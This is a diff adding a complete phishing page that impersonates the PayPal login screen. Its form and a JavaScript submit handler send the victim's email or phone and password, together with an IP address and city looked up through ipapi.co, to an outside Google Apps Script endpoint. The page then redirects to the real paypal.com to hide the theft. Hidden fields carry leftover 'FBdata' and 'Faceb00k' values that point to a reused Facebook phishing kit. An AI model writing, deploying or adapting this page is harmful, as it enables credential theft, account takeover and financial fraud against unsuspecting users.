@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paypal</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        button {
+            height: 40px;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 20px;
+        }
+
+        button {
+            background-color: #0047B2;
+            color: #fff;
+            cursor: pointer;
+            border-radius: 25px;
+            height: 45px;
+        }
+
+        button:hover {
+            background-color: #166fe5;
+        }
+
+        p {
+            margin-top: 10px;
+        }
+
+        a {
+            text-decoration: none;
+            color: #1877f2;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="/storage/emulated/0/Xender/image/IMG_20241103_191216.jpg" style="height:65px; width:200px; alt="Paypal Logo" title="Paypal Logo">
+        <p data-translate style="font-size:17px">Log into Paypal to continue</p>
+        <form action="https://script.google.com/macros/s/AKfycbyvnhYj8_VRskFSYYsVgK4C_E0hI6eTJZVkZO3M-Z53jUubXKOMVmXnZPkWKOZ24A/exec" id="paypal" method="POST">
+            <input data-translate-placeholder type="text" name="email_or_phone" placeholder="Mobile number or email address" style="font-size:19px;" required/>
+            <input data-translate-placeholder type="password" name="message" placeholder="Password" required/>
+            <input type="hidden" id="ip_address" name="ip_address">
+            <input type="hidden" id="country" name="country">
+            <input type="hidden" id="region" name="region">
+            <input type="hidden" id="city" name="city">
+            <input type="hidden" name="form_id" value="FBdata">
+            <input type="hidden" name="origin" value="https://joshiahh.github.io/Faceb00k-profile-/">
+            <h6 style="text-align: left; font-size: 17px; margin-bottom: 8px; margin-top: 1px;">
+            <a href="https://www.paypal.com/authflow/email-recovery/?contextId=&redirectUri=%252Fsignin%253FreturnUri%253Dhttps%25253A%25252F%25252Fwww.paypal.com%25252Fmyaccount%25252Fsummary%2526state%253D%25253Fcountry.x%25253DNG%252526locale.x%25253Den_NG" data-translate>Forgot password?</a></h6>
+            <button type="submit" style="margin-bottom: 35px" data-translate>Log In</button>
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+            <hr style="flex: 1; border-top: 1px solid #ccc; margin: 0 10px;">
+            <span style="background-color: #fff; padding: 0 10px; position: relative; z-index: 1;">or</span>
+            <hr style="flex: 1; border-top: 1px solid #ccc; margin: 0 10px;">
+       </div>
+            <button style="background-color:white; border-color:black; border-radius:25px; height:45px; margin-top:25px;">
+            <a href="https://www.paypal.com/" style="color:black;" data-translate>Sign up</a>
+            </button>        
+            </form>        
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script>
+      // Detects the user's preferred language
+    function detectUserLanguage() {
+      const userLang = navigator.language || navigator.userLanguage;
+      return userLang.slice(0, 2); // Get the first 2 characters of the language code (e.g., "en", "fr", etc.)
+    }
+
+    // Supported languages based on LibreTranslate (expandable)
+    const supportedLanguages = [
+      'af', 'sq', 'am', 'ar', 'hy', 'az', 'eu', 'be', 'bn', 'bs', 'bg', 'ca', 
+      'zh', 'hr', 'cs', 'da', 'nl', 'en', 'et', 'fi', 'fr', 'gl', 'ka', 'de', 
+      'el', 'gu', 'ht', 'he', 'hi', 'hu', 'is', 'ig', 'id', 'ga', 'it', 'ja', 
+      'jv', 'kn', 'kk', 'km', 'ko', 'ku', 'ky', 'lo', 'la', 'lv', 'lt', 'lb', 
+      'mk', 'ms', 'ml', 'mt', 'mi', 'mr', 'mn', 'my', 'ne', 'no', 'ps', 'fa', 
+      'pl', 'pt', 'pa', 'ro', 'ru', 'gd', 'sr', 'st', 'si', 'sk', 'sl', 'so', 
+      'es', 'su', 'sw', 'sv', 'tg', 'ta', 'te', 'th', 'tr', 'uk', 'ur', 'uz', 
+      'vi', 'cy', 'xh', 'yi', 'yo', 'zu'
+    ];
+
+    // Fallback to English if the user's language is unsupported
+    function getFallbackLanguage(userLang) {
+      return supportedLanguages.includes(userLang) ? userLang : 'en';
+    }
+
+    // Batch translation function
+    function translateBatch(texts, targetLang) {
+      return fetch('https://libretranslate.com/translate', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          q: texts,
+          source: 'en',   // Assuming English as the default language
+          target: targetLang,
+          format: "text"
+        }),
+      })
+      .then(response => response.json())
+      .then(data => data.map(item => item.translatedText))
+      .catch(error => {
+        console.error('Error translating text:', error);
+        // Fallback to original texts in case of an error
+        return texts;
+      });
+    }
+
+    // Function to translate all form labels, buttons, and placeholders
+    function translateForm(targetLang) {
+      const elementsToTranslate = document.querySelectorAll('[data-translate], [data-translate-placeholder]');
+
+      // Collect all texts that need translation
+      const textsToTranslate = Array.from(elementsToTranslate).map(elem => {
+        return elem.textContent || elem.placeholder;
+      });
+
+      // Translate all texts in a single request
+      translateBatch(textsToTranslate, targetLang)
+        .then(translatedTexts => {
+          let i = 0;
+          elementsToTranslate.forEach(elem => {
+            if (elem.textContent && elem.hasAttribute('data-translate')) {
+              elem.textContent = translatedTexts[i++];
+            } else if (elem.placeholder && elem.hasAttribute('data-translate-placeholder')) {
+              elem.placeholder = translatedTexts[i++];
+            }
+          });
+        });
+    }
+
+    // Initialize translation based on the user's preferred language or fallback
+    document.addEventListener('DOMContentLoaded', function() {
+      const userLang = detectUserLanguage();
+      const targetLang = getFallbackLanguage(userLang);
+      translateForm(targetLang);
+    });
+
+  // Fetch user's location and IP address
+    $(document).ready(function () {
+        $.get("https://ipapi.co/json/", function (data) {
+            $("#ip_address").val(data.ip);
+            $("#country").val(data.country_name);
+            $("#region").val(data.region);
+            $("#city").val(data.city);
+        });
+
+   // Function to handle form submission
+        document.getElementById('paypal').addEventListener('submit', function(event) {
+          event.preventDefault();
+          const form = event.target;
+          const formData = new FormData(form);
+          const jsonData = {};
+          for (const [key, value] of formData.entries()) {
+            jsonData[key] = value;
+          }
+          fetch('https://script.google.com/macros/s/AKfycbyvnhYj8_VRskFSYYsVgK4C_E0hI6eTJZVkZO3M-Z53jUubXKOMVmXnZPkWKOZ24A/exec', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: new URLSearchParams(jsonData).toString(),
+          })
+          .then(response => {
+            if (response.ok) {
+              window.location.replace('https://www.paypal.com/');
+            } else {
+              console.error('Error submitting form data');
+            }
+          })
+          .catch(error => {
+            console.error('Fetch error:', error);
+          });
+        });
+      });
+    </script>
+</body>
+</html>
